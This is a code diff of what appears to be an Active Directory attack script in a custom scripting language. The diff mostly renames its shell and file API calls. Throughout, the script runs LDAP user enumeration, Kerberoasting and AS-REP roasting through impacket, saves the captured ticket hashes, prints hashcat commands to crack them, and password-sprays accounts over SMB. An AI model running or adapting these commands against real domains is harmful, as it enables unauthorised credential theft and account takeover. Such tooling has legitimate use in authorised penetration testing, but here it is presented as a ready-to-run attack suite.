@@ -1,11 +1,11 @@
-# koppa-ad v1.0 — Active Directory attack suite
+# koppa-ad v1.0 â€” Active Directory attack suite
 # Usage: koppa run koppa-ad <mode> <domain> <dc_ip>
 
-import sys, log, report
+import os, log, report
 
 fn cmd_enum(domain, dc_ip) {
     log.info("===== AD Enumeration: {domain} @ {dc_ip} =====")
-    let out = sys.exec("ldapsearch -x -H ldap://{dc_ip} -b 'DC={domain}' '(objectClass=user)' sAMAccountName 2>/dev/null")
+    let out = os.shell("ldapsearch -x -H ldap://{dc_ip} -b 'DC={domain}' '(objectClass=user)' sAMAccountName 2>/dev/null")
     for line in out.split("\n") {
         if line.contains("sAMAccountName:") {
             let user = line.replace("sAMAccountName: ", "")
@@ -16,11 +16,11 @@ fn cmd_enum(domain, dc_ip) {
 
 fn cmd_kerberoast(domain, dc_ip, user, pass) {
     log.info("===== Kerberoasting: {domain} =====")
-    let out = sys.exec("python3 -m impacket.examples.GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc_ip} -request 2>/dev/null")
+    let out = os.shell("python3 -m impacket.examples.GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc_ip} -request 2>/dev/null")
     if out.contains("$krb5tgs$") {
         log.success("[+] TGS hashes found!")
         log.info(out)
-        sys.write_file("/tmp/kerberoast.txt", out)
+        fs.write("/tmp/kerberoast.txt", out)
         log.info("Saved to /tmp/kerberoast.txt")
         log.info("Crack: hashcat -m 13100 /tmp/kerberoast.txt rockyou.txt")
     } else {
@@ -30,20 +30,20 @@ fn cmd_kerberoast(domain, dc_ip, user, pass) {
 
 fn cmd_asrep(domain, dc_ip, users_file) {
     log.info("===== AS-REP Roasting: {domain} =====")
-    let out = sys.exec("python3 -m impacket.examples.GetNPUsers {domain}/ -usersfile {users_file} -dc-ip {dc_ip} -format hashcat 2>/dev/null")
+    let out = os.shell("python3 -m impacket.examples.GetNPUsers {domain}/ -usersfile {users_file} -dc-ip {dc_ip} -format hashcat 2>/dev/null")
     if out.contains("$krb5asrep$") {
         log.success("[+] AS-REP hashes found!")
         log.info(out)
-        sys.write_file("/tmp/asrep.txt", out)
+        fs.write("/tmp/asrep.txt", out)
         log.info("Crack: hashcat -m 18200 /tmp/asrep.txt rockyou.txt")
     }
 }
 
 fn cmd_spray(domain, dc_ip, users_file, password) {
     log.info("===== Password Spray: {password} =====")
-    let users = sys.read_lines(users_file)
+    let users = fs.read_lines(users_file)
     for user in users {
-        let out = sys.exec("python3 -m impacket.examples.smbclient {domain}/{user}:'{password}'@{dc_ip} -c 'ls' 2>/dev/null")
+        let out = os.shell("python3 -m impacket.examples.smbclient {domain}/{user}:'{password}'@{dc_ip} -c 'ls' 2>/dev/null")
         if out.contains("drw") {
             log.success("[+] Valid: {user}:{password}")
         }
@@ -65,3 +65,4 @@ fn main() {
     if mode == "spray"       { cmd_spray(domain, dc, __args__[3], __args__[4]) }
     log.success("AD attack complete!")
 }
+
